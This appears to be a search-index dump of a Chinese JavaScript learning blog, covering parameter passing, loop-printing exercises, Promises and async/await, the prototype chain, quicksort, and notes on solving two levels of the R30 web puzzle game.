按照前面的思維，這樣子的結果是合理的，因為當變數儲存的是物件時，這個變數儲存的值會是一個「記憶體位址」，所以此時的 function 是這樣子做處理： 123456function add(obj) { var obj = myObj // 0x01 obj.number++ obj.newValue = 'Boom!' return 1} 因為 obj 跟 myObj 儲存的都是同一個記憶體位址，所以當 obj 去做修改或新增的時候，也很合理的會改到 myObj，畢竟「改的都是同一個記憶體位址裡的東西」。 忘記的話再複習一下這張圖： 再來是最後一個例子： 123456789101112function add(obj) { obj = { number: 50 } return 1}var myObj = { number: 10}console.log(myObj) // {number: 10}add(myObj)console.log(myObj) // {number: 10} 用你原本的方式思考就好，在執行到 obj = {number: 50} 之前，其實都跟剛剛的情況是一樣的： 1234567function add(obj) { var obj = myObj // 0x01 obj = { number: 50 } // 0x02 return 1} 在 obj = {number: 50} 之後，obj 就已經被賦予一個新的記憶體位址，已經跟原本的 myObj 指向不同的地方，所以在之後不管你對 obj 做什麼，都不會影響到外面的 myObj。 忘記的話再複習一下這張圖： pass by value ? pass by sharing接下來要來解釋最開始提到的第二件事：JavaScript 中只有 pass by value 或 pass by sharing。 在變數儲存的是「非物件」的資料型態時（string, number, boolean），在 function 中修改引數的值不會影響到外面的值，這種行為我們稱為「pass by value」。 在變數儲存的是「物件」的資料型態時（object, array），在 function 中修改引數的值不會影響到外面的值，這種行為我們稱為「pass by sharing」。 至於為什麼稱為 pass by sharing 而不是 pass by reference？ 根據我在網路上找的資料，pass by reference 的定義是重新賦值時也會影響到原本的變數。意思是說像剛剛 obj = {number: 50} 這個動作執行後 myObj 也會變成 {number: 50}。 不懂 pass by reference 跟 pass by sharing 的差異可以參考這張圖： 既然不是 pass by reference，那該叫什麼？就叫「pass by sharing」吧！可以把它想成是一種約定俗成。 不過如果你換個角度來思考的話，某種意義上 pass by sharing 也可以看做是一種 pass by value： call by sharing（傳記憶體位置進去）其實就是 call by value 的一種，解釋的方式為：其實一樣是傳值的拷貝進去，只是這個值是記憶體位置。 但總而言之，我個人還是覺得分成 pass by value 跟 pass by sharing 的方式比較好理解。 總結最後做個總結： 傳入 function 的變數是「非物件」型態，在 function 做任何修改都不會影響到原本的變數值。 傳入 function 的變數是 object ，在 function 裡做修改會影響到原本的變數值，但重新賦值不會。 另外想引用一下 Huli 的話： 搞清楚到底參數在操作的時候會有怎樣的行為。你要知道 JavaScript 傳 object 進去的時候，可以更改原本物件的值，但重新賦值並不會影響到外部的 object。只要知道這一點，其他的我覺得都沒那麼重要了。 其實這個問題好像一直都沒有最正確的解釋，但總而言之，我們其實想搞懂的是「函式怎麼操作引數」這件事，知道這樣就夠了。 參考資源深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？","link":"/2021/12/18/principle-of-parameter/"},{"title":"印出星星（金字塔）","text":"這是來自 LIOJ 上的題目，因為我居然感到困惑，所以想記錄下來。 找出規律這一題其實就難在找規律，規律如果找不出來，就會想不出解法。 先試著觀察看看： 123 * ******** 要找出的規律是「每行有幾個星星」跟「每行有幾個空格」。 先看空格的部分： 第一行有 2 個空白 第二行有 1 個空白 第三行有 0 個空白 這裡假設 n = 全部有幾行，i = 目前的行數，換句話說就是最外層迴圈的次數： 123for(let i=1; i&lt;=n; i++) { ...} 仔細觀察一下可以看出空白的數量跟 n 還有 i 有關，也就是 n-i = 那一行需要的空格數： 第一行有 3-1 個空白 第二行有 3-2 個空白 第三行有 3-3 個空白 所以空格的部分可以這樣處理： 123for(let i=1; i&lt;=n; i++) { repeat(' ', n-i)} 接著來看星星的部分： 第一行有 1 個星星 第二行有 3 個星星 第三行有 5 個星星 這裡也是我卡住的地方，因為我沒辦法從 n 跟 i 之間找出這個規律，也不知道該從哪裡思考， 不過後來想想其實可以用「數學函數」的方式來思考，例如： f(i) = 對 i 做某個算式 = 輸出值 f(1) = 1 f(2) = 3 f(3) = 5 從這裡可以發現規律是 「每一圈都會增加 2」，也就是說，每一圈都要 x2： 1234f(i) = i * 2f(1) = 2f(2) = 4f(3) = 6 做到這裡後應該不難發現，只要再把每一項 -1，就能達成目標： 1234f(i) = i * 2 - 1f(1) = 1f(2) = 3f(3) = 5 所以最後 2i-1 可以完成這個函數，規律就找出來了： 123for(let i=1; i&lt;=n; i++) { repeat('*', i*2-1)} 最後把整個程式組合一下： 123for(let i=1; i&lt;=n; i++) { console.log(repeat(' ', n-i) + repeat('*', i*2-1))} 這樣就解完這題了。 最後再考你一題： 123f(1) = 0f(2) = 2f(3) = 4 想完再來看解答 答案是：f(i) = 2i - 2 紀錄附上原始程式碼，原本的想法是「建立一個奇數陣列來做 mapping」： 第 1 行會在 createStarts() 代入 1，產出 1 個星星 第 2 行會在 createStarts() 代入 3，產出 3 個星星 第 3 行會在 createStarts() 代入 5，產出 5 個星星 以此類推 12345678910111213141516171819202122232425262728293031323334353637function solve(lines) { // 總共有幾行 let n = Number(lines[0]) // 用來儲存奇數的陣列 let arr = [] // 建立陣列（輸入範圍是 1 ~ 30，所以第 30 行會有 59 顆星星） for(let i=1; i&lt;=60; i++) { // 只儲存奇數 if(i&amp;1) arr.push(i) } // 印出 1 ~ n 行 for(let i=1; i&lt;=n; i++) { // 儲存最後要印出的內容 let content = '' // 陣列從 0 開始，所以才得 arr[i-1] content = createWhiteSpace(n-i) + createStarts(arr[i-1]) console.log(content) }}// 第 i 行會有 n-i 個空白function createWhiteSpace (n) { let result = '' for(let i=0; i&lt;n; i++) { result += ' ' } return result}// 依照 1, 3, 5 的順序印出星星function createStarts (n) { let result = '' for(let i=0; i&lt;n; i++) { result += '*' } return result}","link":"/2021/12/23/print-stars/"},{"title":"印出聖誕樹","text":"來自 LIOJ 上的題目，還是有不太熟悉，所以在練習一次。 解題思維這一題可以先拆成兩個部分： 星星的總行數 木棒的總行數 星星總共會有 n 行，所以迴圈會寫成： （i 從 1 開始是因為函式的參數需要，如果從 0 開始的話會不太方便） 123for(let i=1; i&lt;=n; i++) { console.log('*', i)} 木棒總共會有 n-1 行，所以迴圈會寫成： （一樣需要傳遞引數，所以 i 從 1 開始） 123for(let i=1; i&lt;=n-1; i++) { console.log('|', i)} 這樣就完成了基本架構： solve(['2'])： 123**| solve(['3'])： 1234***| 接著再來處理「每行的星星」跟「每行的木棒」就大功告成了。 每行的星星數量規律為 2i-1，星星的空格為 n-i 每行的木棒數量固定，木棒的空格規律為 n-1 所以把前面寫好的部分稍微改寫一下： 1234567// 星星for(let i=1; i&lt;=n; i++) { console.log(repeat(' ', n-i) + repeat('*', 2*i-1))}for(let i=1; i&lt;=n-1; i++) { console.log(repeat(' ', n-1) + '|')} 這樣就大功告成！ solve(['3'])： 12345 * ******** | |","link":"/2021/12/26/print-tree/"},{"title":"用 Promise 來包裝 XMLHttpRequest","text":"懶人一下。 簡述比較熟悉後就可以把一些東西改用 Promise 來包裝，例如：XMLHttpRequest 123456789101112131415function sendRequest () { return new Promise((resolve, reject) =&gt; { const request = new XMLHttpRequest(); request.open('GET', api200, true); // 成功就 call resove request.onload = () =&gt; resolve(JSON.parse(request.responseText)); // 失敗就 call reject request.onerror = () =&gt; reject('發生未預期的錯誤！'); request.send(); })}sendRequest() .then(res =&gt; console.log(res)) .catch(err =&gt; console.log(err))","link":"/2022/03/03/promise-and-xhr/"},{"title":"自己捏一個 Promise","text":"自己捏比較好懂。 簡述直接看例子： 123456789const mySuccessPromise = new Promise((resolve, reject) =&gt; { resolve('Ya!!!!');});const myFailedPromise = new Promise((resolve, reject) =&gt; { reject('No~~~~')})mySuccessPromise.then(data =&gt; console.log('data =', data));myFailedPromise.catch(data =&gt; console.log('data =', data)); 就跟在 fetch 裡講的一樣，resolve 代表成功，所以用 then 來拿到我們在 Promise 裡面寫的內容；而 reject 代表失敗，所以用 catch 來拿到內容。 當然，也可以利用回傳 Promise 的方式來寫在一起： 123456789101112131415const mySuccessPromise = new Promise((resolve, reject) =&gt; { resolve('Ya!!!!');});const myFailedPromise = new Promise((resolve, reject) =&gt; { reject('No~~~~')})mySuccessPromise .then(data =&gt; { console.log('data =', data); return myFailedPromise; }) .catch(data =&gt; { console.log('data =', data); });","link":"/2022/03/03/promise-create/"},{"title":"Promise 最大的用途？","text":"最麻煩的非同步。 簡述我想它最大的用途是用來處裡「非同步」的行為。 舉個例子： 1234567const sleep = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { resolve('我睡飽了'); }, 1000)});// 一秒後印出 '我睡飽了'sleep.then(end =&gt; console.log(end)); 簡單來說，不管你在 Promise 裡面做什麼非同步操作，then 都會等到 resolve 被 trigger 才會執行。 再來看個例子： 12345678910111213function sleep (ms) { return new Promise(resolve =&gt; { setTimeout(resolve, ms) })}sleep(1000) .then(first =&gt; { console.log('1 秒過了，', first) return sleep(1000) }) .then(second =&gt; { console.log('又 1 秒過了，', second) }) 這邊只是想確認你知道流程是什麼： sleep(1000) 會回傳一個 Promise，而這個 Promise 會在一秒後呼叫 resolve，因此第一個 then 就會在一秒之後被執行。 接著，then 裡又回傳了 sleep(1000)，等於又回傳了一個 Promise，所以一秒後 Promise 又呼叫 resolve，執行了下一個 then。 另外，因為 resolve 並沒有傳入任何值，所以兩個 then 都只會拿到 undefined。","link":"/2022/03/03/promise-purpose/"},{"title":"Promise 的小技巧","text":"在巴哈姆特上學到的。 原理簡述其實原理應該就是 async await 的語法，只要建立一個 Promise 就可以用 await 來強制等 Promise 執行完才執行後面的程式碼，換句話說就是強制把「非同步 -&gt; 同步」的感覺吧？ 這一塊我還沒學到，所以只是我大概瞎猜的，但沒關係就先記下來吧！ 備註：await 必須包在 async 開頭的 function 裡面才能用，意思就是「這個 function 裡有非同步 function 的意思吧！」。 備註：await 後面只要接 Promise，就會等這個 Promise 執行 resolve 或 reject 完才會往下執行。 備註：我很常會把 resolve 放錯地方。記住一個要訣：resolve 一定要放在非同步執行完的那個「 callback」裡面呼叫，這樣子才會等非同步執行後再往下跑。 補充－async 不是你想的那樣注意 async 指的是「裡面」有非同步 function，不是「function 自己」是非同步函式，把下面兩段拿去跑你就懂了。 不是非同步： 123456789async function fakeAsync() { console.log('fake asnyc!!!')}for(let i=0; i&lt;=100; i++) { // 如果這個真的是非同步 fakeAsync() // 那這行就應該要比上面的先執行 console.log('sync!! \\n')} 是非同步： 123456789async function asyncFunction() { console.log('asnyc!!!')}for(let i=0; i&lt;=100; i++) { // 用 setTimeout 變非同步 setTimeout(asyncFunction, 0) // 所以這行會先執行 console.log('sync!! \\n')} 範例一 更新變數的值一般的情況： 123456789~async function() { let a = 10 setTimeout(function() { a = 100 }, 1000) // 上面是非同步，不會等上面執行完才執行 // 所以 a = 10 console.log(a)}() 利用 Promise + await： 12345678910111213~async function() { let a = 10 // 等 Promise 執行完才執行後面的程式碼 await new Promise((resolve, reject) =&gt; { setTimeout(function() { // 更新 a = 100 a = 100 // 這執行完後才往下執行 resolve() }, 1000) }) console.log(a)}() 範例二 讓迴圈的速度變成 LKK年輕版（錯誤示範）： 12345678910~async function() { // 這邊故意用 var 不用 let for (var i=1; i&lt;=5; i++) { // 經典的閉包題目 // 一秒後會印出 5 個 6 setTimeout(function() { console.log(i) }, 1000) }}() 老年版： 123456789101112~async function() { for (let i=0; i&lt;=10; i++) { // 每一圈都要先等一秒 await new Promise((resolve, reject) =&gt; { setTimeout(function() { resolve() }, 1000) }) // 才會執行這裡 console.log(i) }}() 範例三 發送 request傳說中的 callback hell： 12345678910111213141516const request = require('request')request('https://reqres.in/api/users/1', function(err, res, body) { console.log('拿到第一筆資料了！', JSON.parse(body)) // call 下一筆 API request('https://reqres.in/api/users/2', function(err, res, body) { console.log('拿到第二筆資料了！', JSON.parse(body)) // call 下一筆 API request('https://reqres.in/api/users/3', function(err, res, body) { console.log('拿到第三筆資料了！', JSON.parse(body)) // call 下一筆 API request('https://reqres.in/api/users/4', function(err, res, body) { console.log('拿到第四筆資料了！', JSON.parse(body)) }) }) })}) 改用 Promise + async： 12345678910111213141516171819202122232425262728293031323334~async function() { // API 1 await new Promise((resolve, reject) =&gt; { request('https://reqres.in/api/users/1', (err, res, body) =&gt; { console.log('拿到第一筆資料了！', JSON.parse(body)) // 往下執行 resolve() }) }) // API 2 await new Promise((resolve, reject) =&gt; { request('https://reqres.in/api/users/2', (err, res, body) =&gt; { console.log('拿到第二筆資料了！', JSON.parse(body)) // 往下執行 resolve() }) }) // API 3 await new Promise((resolve, reject) =&gt; { request('https://reqres.in/api/users/3', (err, res, body) =&gt; { console.log('拿到第三筆資料了！', JSON.parse(body)) // 往下執行 resolve() }) }) // API 4 await new Promise((resolve, reject) =&gt; { request('https://reqres.in/api/users/4', (err, res, body) =&gt; { console.log('拿到第四筆資料了！', JSON.parse(body)) // 往下執行 resolve() }) })}() 同場加映 Promise 的原本用法暫時先放這吧！不然我也不知道該放哪才好～ 12345678910111213141516171819202122232425262728293031// 根據 id 取得 user 資料function getUser(id) { return new Promise((resolve, reject) =&gt; { request(`https://reqres.in/api/users/${id}`, (err, res, body) =&gt; { // 成功拿到資料 if (body) { // 就把資料帶回去 resolve(body) } else { // 失敗就帶錯誤回去 reject(err) } }) })}// 從第一筆開始發getUser(1) .then((data) =&gt; { console.log('第一筆資料！' ,JSON.parse(data)) return getUser(2) }) .then((data) =&gt; { console.log('第二筆資料！', JSON.parse(data)) return getUser(3) }) .then((data) =&gt; { console.log('第三筆資料！', JSON.parse(data)) }) .catch((err) =&gt; console.log('err:', err)) .catch((err) =&gt; console.log('err:', err)) .catch((err) =&gt; console.log('err:', err)) 同場加映 async 的原本用法12345678910111213141516171819202122232425262728293031323334353637// 根據 id 取得 user 資料function getUser(id) { return new Promise((resolve, reject) =&gt; { request(`https://reqres.in/api/users/${id}`, (err, res, body) =&gt; { // 成功拿到資料 if (body) { // 就把資料帶回去 resolve(body) } else { // 失敗就帶錯誤回去 reject(err) } }) })}~async function() { /* 依序取得 user1, user2, user3， 加 {} 是為了建立區塊作用域， 不然沒辦法重複用 data 來解構 */ { const json = await getUser(1) const { data } = JSON.parse(json) console.log(data) } { const json = await getUser(2) const { data } = JSON.parse(json) console.log(data) } { const json = await getUser(3) const { data } = JSON.parse(json) console.log(data) }}() 或搭配迴圈寫的更簡潔： 1234567891011121314151617181920212223// 根據 id 取得 user 資料function getUser(id) { return new Promise((resolve, reject) =&gt; { request(`https://reqres.in/api/users/${id}`, (err, res, body) =&gt; { // 成功拿到資料 if (body) { // 就把資料帶回去 resolve(body) } else { // 失敗就帶錯誤回去 reject(err) } }) })}~async function() { for (let i=1; i&lt;=3; i++) { // 每圈都會先等這行執行完才往下執行 const json = await getUser(i) const { data } = JSON.parse(json) console.log(i, data) }}() 同場加映 async 的回傳值也是一個 Promise只要回傳的是 Promise，就可以一直 then 下去： 123456789101112131415161718async function user1() { const json = await getUser(1) console.log({ data } = JSON.parse(json))}/* 先抓第一筆 user，接著 .then: 抓第二筆，注意裡面也是 async 函式，因此最後回傳 Promise .then: 抓第三筆，同上*/user1() .then(async() =&gt; { const json = await getUser(2) console.log({ data } = JSON.parse(json)) }) .then(async() =&gt; { const json = await getUser(3) console.log({ data } = JSON.parse(json)) }) 同場加映 比 setTimeout 難一點的 setInterval希望你能成為非同步操控大師： 123456789101112131415161718192021222324252627282930function count(msg, ms) { return new Promise((resolve, reject) =&gt; { // 計數器 let counter = 0 // 建立計數器 let timer = setInterval(() =&gt; { /* callback 流程 1. 先把 counter + 1 2. 印出輸入的文字 + counter 3. 檢查 counter 值，超過 5 就移除計數器 */ counter++ console.log(`${msg}: ${counter}`) if (counter === 5) { // 清除計時器 clearInterval(timer) // 等計數器清除後，才執行 resolve resolve() } }, ms) })}~async function() { console.log('1') // 等到 resolve 被執行後才會往下跑 await count('yo', 100) console.log('2')}() 耍帥的寫法（其實跟上面一模一樣）： 12345678910111213141516171819~async function() { console.log(1) await new Promise((resolve, reject) =&gt; { // IIFE ~function(msg, ms) { let counter = 0 const timer = setInterval(() =&gt; { counter++ console.log(`${msg}: ${counter}`) if (counter === 5) { clearInterval(timer) resolve() } }, ms) }('yo', 100) // IIFE END }) console.log(2)}() 同場加映 更好懂的排序方式123456789101112131415161718192021222324252627282930313233const request = require('request')async function getUser(id) { // 儲存 response let json = null await new Promise((resolve) =&gt; { request({ url: `https://reqres.in/api/users/${id}`, }, (err, res, body) =&gt; { // 拿到 response json = body // 才往下執行 resolve() }) }) // 回傳拿到的資料 return json}function getAllUsers(user1, user2, user3) { console.log('user1', JSON.parse(user1)) console.log('user2', JSON.parse(user2)) console.log('user3', JSON.parse(user3))}/* 主要的 function */~async function() { // 按照順序取得 1, 2, 3 的資料 const user1 = await getUser(1) const user2 = await getUser(2) const user3 = await getUser(3) // 拿到之後再丟給要處理的 function getAllUsers(user1, user2, user3)}() 取得所有資料 Promise.All當你想一次打多個 API 時，應該就會用到這個方法： 123456789101112131415161718192021222324252627282930313233// 可以改成 false 來測試let data = { name: 'jim', email: 'jimjim@gmail.com' }const youtubeAPI = new Promise(resolve =&gt; { setTimeout(() =&gt; { resolve({ video: [1, 2, 3, 4, 5] }) }, 3000)})const facebookAPI = new Promise(resolve =&gt; { setTimeout(() =&gt; { resolve({ user: 'name' }) }, 1000)})const checkPermission = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { data ? resolve(data) : reject(`We don't find the data.`) }, 2000)})Promise.all([youtubeAPI, facebookAPI, checkPermission]).then(result =&gt; { // 拿到所有結果 console.log(result[0]) console.log(result[1]) console.log(result[2])}).catch(err =&gt; { // 只要其中一個出錯，就跳到這裡 console.log(err);})","link":"/2022/01/22/promise-trick/"},{"title":"理解原型鍊的運作","text":"等這一天好久了。 簡述在 ES5 實作物件導向 裡有提到透過「prototype」可以讓每個 instance 參考到同一個 function。但並沒有解釋實際上是怎麼做到的？所以這邊就來解釋一下。 首先有個東西叫做 __proto__，它的作用就是： 如果在這個 instance 上找不到，就去它的 prototype 找找看。 來舉個例子： 123456789101112function Person (name) { this.name = name;}Person.prototype.getName = function () { console.log(this.name);}Person.prototype.setName = function (newName) { this.name = newName;}const peanu = new Person('PeaNu');console.log(peanu.getName); // PeaNu 按照前面所說，peanu 本身沒有 getName，所以會透過 __proto__ 去找到上一層 prototype： 1234// Person: {getName: [Function (anonymous)]}console.log(peanu.__proto__);// trueconsole.log(peanu.__proto__ === Person.prototype); 所以背後就是透過 __proto__ 來找到 Person.prototype 再找到 getName 的。 但「往上找」這個動作其實能做很多次，所以它的完整流程會是這樣： peanu 有沒有 getName 沒有？那peanu.__proto__ 有沒有 getName =&gt; Person.prototype 沒有？那 peanu.__proto__.__proto__ 有沒有 getName =&gt; Object.prototype 沒有？那 peanu.__proto__.__proto__.__proto__ 有沒有 getName =&gt; null 這一連串的過程就稱為「Prototype chain（原型鍊）」，因為透過 __proto__ 一直往上找，往上找，往上找。就跟 Scope chain 的概念是一樣的。 當原型鍊找到頂的時候就會回傳 null，所以只有在都找不到的情況下才會噴 Error。 實作原型鍊理解上面的觀念後，就可以來實作這個流程： 12345678910111213141516171819202122232425262728function Person (name) { this.name = name;}// 綁在 Object 上Object.prototype.getName = function () { console.log('Object', this.name);}// 綁在 Person 上Person.prototype.getName = function () { console.log('Peson', this.name)}function prototypeChain (instance, methods) { // 到頂了 if (instance.__proto__ === null) { throw new Error('Can not find methods'); } // 找到了 if (instance.__proto__[methods]) { // 用 call 來呼叫，並且讓 this 指向 instance return instance.__proto__[methods].call(instance); } return prototypeChain(instance.__proto__, methods);}const peanu = new Person('peanu');prototypeChain(peanu, 'getName'); 這邊同時在 Object 和 Person 都綁上 getName 是為了模擬「往上找」這個動作。 當兩個同時存在時， Person 會先被找到，所以會呼叫 Person.prototype.getName；只有 Object 存在時就會呼叫 Object.prototype.getName；如果都不存在，最後會找到頂，執行 throw new Error。 這個就是原型鍊的流程，做完後感覺更理解了。 最後給個小範例，讓你更清楚每個資料型別對應的 prototype 是誰： 12345678910111213function Person () {}const obj = {};const arr = [];const str = '123';const bool = false;const num = 123;console.log(Person.__proto__ === Function.prototype);console.log(obj.__proto__ === Object.prototype);console.log(arr.__proto__ === Array.prototype);console.log(str.__proto__ === String.prototype);console.log(bool.__proto__ === Boolean.prototype);console.log(num.__proto__ === Number.prototype); 其他和原型鍊有關的 methodhasOwnProperty 用來檢查一個 method 是在 instance 身上還是在 prototype 身上： 12345678910function Person (name) { this.name = name;}Person.prototype.getName = function () { console.log(this.name);}const peanu = new Person('peanu');console.log(peanu.hasOwnProperty('getName')) // falseconsole.log(peanu.__proto__.hasOwnProperty('getName')) // true instanceof 檢查 A 是不是 B 的 instance： 123456789function Person (name) { this.name = name;}const peanu = new Person('peanu');console.log(peanu instanceof Person); // trueconsole.log(peanu instanceof Object); // trueconsole.log(peanu instanceof Array); // falseconsole.log(peanu instanceof Function); // false 這邊也自己實作了一下： 12345678910111213141516function Person (name) { this.name = name;}const peanu = new Person('peanu');function myinstanceof (instance, compare) { if (instance.__proto__ === null) return false if (instance.__proto__ === compare.prototype) return true return myinstanceof(instance.__proto__, compare);}console.log(myinstanceof(peanu, Person)); // trueconsole.log(myinstanceof(peanu, Object)); // trueconsole.log(myinstanceof(peanu, Array)); // falseconsole.log(myinstanceof(peanu, Function)); // false constructor（屬性） 每個 prototype 都會有 constructor 屬性，這個值就是建構函式自己： 123456789101112131415function Person (name) { this.name = name;}Person.prototype.getName = function () { console.log(this.name);}const peanu = new Person('peanu');// 如果是透過 instance 來找的話，實際是透過原型鍊來往上找的console.log(peanu.constructor === Person); // trueconsole.log(peanu.hasOwnProperty('constructor')) // falseconsole.log(Person.prototype.constructor === Person); // trueconsole.log(Person.prototype.hasOwnProperty('constructor')) // true;","link":"/2022/03/18/prototype-chain/"},{"title":"快速排序法（Quick-sort）","text":"一樣是大腦懂，但程式碼抽象QQ。 概念先選定一個數字當基準點，接著把剩下的數列分組，比基準點「小的放左邊」，「大的放右邊」。 接著利用「遞迴」的概念，把好分組的數列再重複一次剛剛的步驟，直到剩下「空元素或一個元素為止」 流程圖： 實作1234567891011121314151617181920212223242526272829function quickSort(arr) { // 停止點，當 arr 長度為 1 或沒有元素了 if (arr.length &lt;= 1) { return arr } // 基準點 index const pivotIndex = Math.floor(arr.length / 2) // 基準點 number const pivotNumber = arr.splice(pivotIndex, 1)[0] // 比基準點小的數列 let samllerNumbers = [] // 比基準點大的數列 let biggerNumbers = [] // 把小的放到 samll，大的放到 bigger for (let i=0; i&lt;arr.length; i++) { if (arr[i] &lt; pivotNumber) { samllerNumbers.push(arr[i]) } else { biggerNumbers.push(arr[i]) } } // 把小的跟大的都丟到 quickSort 遞迴，最後要跟 pivot 結合起來 return quickSort(samllerNumbers).concat([pivotNumber], quickSort(biggerNumbers))}const numbers = [5, 44, 23, 3, 42, 4, 2]console.log(quickSort(numbers)) 詳細流程： 12345678910111213141516171819202122232425262728293031// 拆解流程pivotNumber: 3samllerNumbers: [ 2 ]biggerNumbers: [ 5, 44, 23, 42, 4 ]pivotNumber: 23samllerNumbers: [ 5, 4 ]biggerNumbers: [ 44, 42 ]pivotNumber: 4samllerNumbers: []biggerNumbers: [ 5 ]pivotNumber: 42samllerNumbers: []biggerNumbers: [ 44 ]// 接下來要 return 回去pivotNumber: 42return [].concat([ 42 ], [ 44 ]) =&gt; [ 42, 44 ] =&gt; [ 42, 44 ]pivotNumber: 4return [ ].concat([ 4 ], [ 5 ]) =&gt; [ 4, 5 ]pivotNumber: 23return [ 4, 5 ].concat([ 23 ], [ 42, 44 ]) =&gt; [ 4, 5, 23, 42, 44 ]pivotNumber: 3return [ 2 ].concat([ 3 ], [ 4, 5, 23, 42, 44 ]) =&gt; [ 2, 3, 4, 5, 23, 42, 44 ]result：[2, 3, 4, 5, 23, 42, 44] 或者參考下面的圖： 結語上面的做法其實不是最好的寫法，但優點是可讀性比較好。 等未來比較理解一點後可以參考：這篇 第二種作法遞迴的部分看不太懂是怎麼遞迴的，所以先暫時放在這裡： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 換位置function swap(array, i, j) { let temp = array[i] array[i] = array[j] array[j] = temp}/* array = 數列 start = 搜索起點 end = 搜索終點*/function divide(array, start, end) { // pivot = 最後一個數字 const pivot = array[end-1] // 指標初始值（起點的前一個位置） let index = start - 1 // 遍歷數列 for (let i=start; i&lt;end-1; i++) { // 數字比 pivot 小 if (array[i] &lt; pivot) { // 先把 index 往右移 index++ // 在把數字放到 index 的位置 swap(array, i, index) } } /* 更新 pivot 的位置 end-1: pivot 原本的位置 index+1: pivot 該放到的位置 */ swap(array, index+1, end-1) // 回傳最後 pivot 的位置 return index+1}function quickSort(array, start, end) { // 設定搜尋終點初始值 end = end || array.length if (start &lt; end-1) { // 最後 pivot 的位置 const lastPivotPosition = divide(array, start, end) // 遞迴左半邊的數列（比 pivot 小的） quickSort(array, start, lastPivotPosition) // 遞迴右半邊的數列（比 pivot 大的） quickSort(array, lastPivotPosition+1, end) } return array}const numbers = [15, 12, 3, 2, 7]quickSort(numbers, 0, numbers.length)console.log(numbers)","link":"/2022/01/17/quick-sort/"},{"title":"R30 異世界網站挑戰－簡短紀錄","text":"留個紀錄。 簡述首先這遊戲是來自：r3:0 異世界網站挑戰 這篇不是攻略文，只是單純把我卡特別久的關卡做紀錄。如果想看詳細的攻略文直接 Google 遊戲名稱就會看到一大堆了。 關卡五 https://r30challenge.herokuapp.com/lv5.php?token=csspersona! 這關其實我早就用 devtool &gt; network 發現 https://r30challenge.herokuapp.com/js/lv5.js 裡面寫著： 1window.location='./lv6.php?token=fail'; 就是因為執行了這一行才被轉址。 讓我卡很久的地方是我想不到怎麼阻止 JS 做壞事，看完攻略文後才知道原來是在轉址前就 ESC 來阻止，有夠殘念… 關卡十 https://r30challenge.herokuapp.com/lv10.php?token=EFEFABMN 這一關就是把這個 function 解出來： 123456789101112function isTokenValid($token) { if (strlen($token) !== 8) return false; for($i = 1; $i &lt;= 7; $i+=2) { if (( ord($token[$i]) * ord($token[$i - 1]) ) % $i !== 0) { return false; } } return true; } if (strlen($token) !== 8) return false; 意思是 token 是長度為 8 的字串。 至於迴圈的部分可以先照著寫，這樣就比較好分析邏輯了： 12345678# 第一圈char[0] * char[1] % 1 === 0 # 第二圈char[2] * char[3] % 3 === 0# 第三圈char[4] * char[5] % 5 === 0# 第四圈char[6] * char[7] % 7 === 0 所以這邊能看出是找出相乘結果是 1, 3, 5, 7 倍數的兩個數字。 知道邏輯後 function 就不難寫了： 備註：因為 0 ~ 32 的 ASCII 是系統字元，所以這邊不考慮 123456789101112131415161718192021function findCommonMultiple(n) { let collection = []; // 從 33 ~ 126 找出倍數 for (let i=34; i&lt;=126; i++) { // 前一個數字 x 目前數字求餘數 if ((i-1) * i % n === 0) { // 是倍數就轉成字元 push 到陣列裡 collection.push([String.fromCharCode(i-1), String.fromCharCode(i)]); } } // 所有符合的字串 return collection;}// 儲存結果const total = []// 分別找出 1, 3, 5, 7 的倍數for (let i=1; i&lt;=7; i+=2) { total.push(findCommonMultiple(i));}// 印出結果console.log(total); Output： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677[ // 1 的倍數 [ [ '!', '\"' ], [ '\"', '#' ], [ '#', '$' ], [ '$', '%' ], [ '%', '&amp;' ], [ '&amp;', \"'\" ], [ \"'\", '(' ], [ '(', ')' ], [ ')', '*' ], [ '*', '+' ], [ '+', ',' ], [ ',', '-' ], [ '-', '.' ], [ '.', '/' ], [ '/', '0' ], [ '0', '1' ], [ '1', '2' ], [ '2', '3' ], [ '3', '4' ], [ '4', '5' ], [ '5', '6' ], [ '6', '7' ], [ '7', '8' ], [ '8', '9' ], [ '9', ':' ], [ ':', ';' ], [ ';', '&lt;' ], [ '&lt;', '=' ], [ '=', '&gt;' ], [ '&gt;', '?' ], [ '?', '@' ], [ '@', 'A' ], [ 'A', 'B' ], [ 'B', 'C' ], [ 'C', 'D' ], [ 'D', 'E' ], [ 'E', 'F' ], [ 'F', 'G' ], [ 'G', 'H' ], [ 'H', 'I' ], [ 'I', 'J' ], [ 'J', 'K' ], [ 'K', 'L' ], [ 'L', 'M' ], [ 'M', 'N' ], [ 'N', 'O' ], [ 'O', 'P' ], [ 'P', 'Q' ], [ 'Q', 'R' ], [ 'R', 'S' ], [ 'S', 'T' ], [ 'T', 'U' ], [ 'U', 'V' ], [ 'V', 'W' ], [ 'W', 'X' ], [ 'X', 'Y' ], [ 'Y', 'Z' ], [ 'Z', '[' ], [ '[', '\\\\' ], [ '\\\\', ']' ], [ ']', '^' ], [ '^', '_' ], [ '_', '`' ], [ '`', 'a' ], [ 'a', 'b' ], [ 'b', 'c' ], [ 'c', 'd' ], [ 'd', 'e' ], [ 'e', 'f' ], [ 'f', 'g' ], [ 'g', 'h' ], [ 'h', 'i' ], [ 'i', 'j' ], [ 'j', 'k' ], [ 'k', 'l' ], [ 'l', 'm' ], [ 'm', 'n' ], [ 'n', 'o' ], [ 'o', 'p' ], [ 'p', 'q' ], [ 'q', 'r' ], [ 'r', 's' ], [ 's', 't' ], [ 't', 'u' ], [ 'u', 'v' ], [ 'v', 'w' ], [ 'w', 'x' ], [ 'x', 'y' ], [ 'y', 'z' ], [ 'z', '{' ], [ '{', '|' ], [ '|', '}' ], [ '}', '~' ] ], // 3 的倍數 [ [ '!', '\"' ], [ '#', '$' ], [ '$', '%' ], [ '&amp;', \"'\" ], [ \"'\", '(' ], [ ')', '*' ], [ '*', '+' ], [ ',', '-' ], [ '-', '.' ], [ '/', '0' ], [ '0', '1' ], [ '2', '3' ], [ '3', '4' ], [ '5', '6' ], [ '6', '7' ], [ '8', '9' ], [ '9', ':' ], [ ';', '&lt;' ], [ '&lt;', '=' ], [ '&gt;', '?' ], [ '?', '@' ], [ 'A', 'B' ], [ 'B', 'C' ], [ 'D', 'E' ], [ 'E', 'F' ], [ 'G', 